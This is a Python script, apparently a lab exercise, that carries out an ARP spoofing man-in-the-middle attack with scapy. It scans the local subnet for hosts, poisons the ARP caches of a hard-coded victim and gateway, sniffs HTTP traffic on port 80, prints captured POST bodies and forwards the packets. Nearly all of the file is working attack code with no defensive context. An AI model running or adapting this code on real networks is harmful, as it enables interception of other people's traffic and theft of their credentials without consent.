#!/usr/bin/env python3
import netifaces as ni
import os
import scapy.all as scapy
from scapy.layers.http import HTTPRequest
import time

class Attack():
    def __init__(self):
        self.ip_list = []
        self.network = []
        self.ip_mac = {}
        self.interfaces = ni.interfaces()
        self.attacker, self.victim, self.ap = '10.0.2.4', '10.0.2.5', '10.0.2.1'

    def get_ip(self):
        for i in self.interfaces:
            self.ip_list.append(ni.ifaddresses(i)[2][0]['addr'])
        self.network = ['.'.join(i.split('.')[:-1]) + '.0/24' for i in self.ip_list]

    def get_mac(self, network):
        arp_request = scapy.ARP(pdst = network)
        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast / arp_request
        result = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)[0]
        for sent, received in result:
            self.ip_mac[received.psrc] = received.hwsrc

    def spoof(self, target_ip, spoof_ip): 
        target_mac = self.ip_mac[target_ip]
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=0)

    def restore(self, dest_ip, src_ip):
        dest_mac = self.ip_mac[dest_ip]
        src_mac = self.ip_mac[src_ip]
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=0)

    def arp_spoofing(self):
        while 1:
            self.spoof(self.victim, self.ap)
            self.spoof(self.ap, self.victim)
            time.sleep(2)

    def ret_arp_spoofing(self):
        while 1:
            self.restore(self.victim, self.ap)
            self.restore(self.ap, self.victim)
            time.sleep(2)
    
    def sniff_packets(self):
        scapy.sniff(filter="tcp port 80", prn=self.process_packet, iface=self.interfaces[1], store=False)

    def process_packet(self, packet):
        print('get\n', ' ', packet.layers(), '\n', packet.show(), '\n')
        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
            print("{packet[scapy.Raw].load}\n")
        
        if packet[scapy.Ether].dst != self.ip_mac[self.ap]:
            packet[scapy.Ether].dst = self.ip_mac[self.ap]
        else:
            packet[scapy.Ether].dst = self.ip_mac[self.victim]
        print('\n', packet.layers(), '\n', packet.show(), '\n')
        scapy.send(packet, verbose=0)
        print('done\n')

attack = Attack()
attack.get_ip()
attack.get_mac(attack.network[1])
print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
#attack.arp_spoofing()
attack.sniff_packets()
